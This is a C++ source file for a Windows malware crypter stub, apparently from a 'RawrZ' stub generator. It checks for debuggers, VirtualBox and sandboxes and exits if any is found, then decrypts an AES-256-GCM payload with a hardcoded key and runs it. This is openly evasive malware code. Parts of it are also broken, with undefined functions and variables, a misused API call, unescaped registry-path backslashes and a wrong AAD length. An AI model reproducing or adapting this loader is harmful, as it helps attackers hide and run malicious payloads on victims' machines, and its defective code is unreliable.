#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

// Anti-Debug Code
bool isDebuggerPresent() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

// Anti-VM Code
bool isVirtualMachine() {
    // Check for VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\ControlSet001\Services\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Anti-Sandbox Code
bool isSandbox() {
    // Check system uptime
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // Less than 10 minutes
        return true;
    }
    return false;
}

// Decryption Code
std::vector<unsigned char> decryptPayload() {
    const std::string key = "9dc094116575a06bb86bff5d389473ba4a7641591840f19b6bb6b8c75d55f5ef";
    const std::string iv = "548768468cb8df654c79144c";
    const std::string authTag = "fb6a0e35de6299053e09765fb965d9a8";
    
    // Convert hex strings to bytes
    std::vector<unsigned char> keyBytes = hexToBytes(key);
    std::vector<unsigned char> ivBytes = hexToBytes(iv);
    std::vector<unsigned char> authTagBytes = hexToBytes(authTag);
    
    // Initialize OpenSSL
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, keyBytes.data(), ivBytes.data());
    
    // Set AAD
    EVP_DecryptUpdate(ctx, NULL, NULL, (unsigned char*)"RawrZ-Stub-Generator", 19);
    
    // Decrypt
    std::vector<unsigned char> decrypted(payload_data.length());
    int len;
    EVP_DecryptUpdate(ctx, decrypted.data(), &len, (unsigned char*)payload_data.c_str(), payload_data.length());
    
    // Set auth tag
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, authTagBytes.data());
    
    // Finalize
    int finalLen;
    EVP_DecryptFinal_ex(ctx, decrypted.data() + len, &finalLen);
    
    EVP_CIPHER_CTX_free(ctx);
    
    decrypted.resize(len + finalLen);
    return decrypted;
}

int main() {
    // Anti-analysis checks
    if (isDebuggerPresent()) {
        ExitProcess(1);
    }
    
    if (isVirtualMachine()) {
        ExitProcess(1);
    }
    
    if (isSandbox()) {
        ExitProcess(1);
    }
    
    // Decrypt and execute payload
    std::vector<unsigned char> payload = decryptPayload();
    if (!payload.empty()) {
        executePayload(payload);
    }
    
    return 0;
}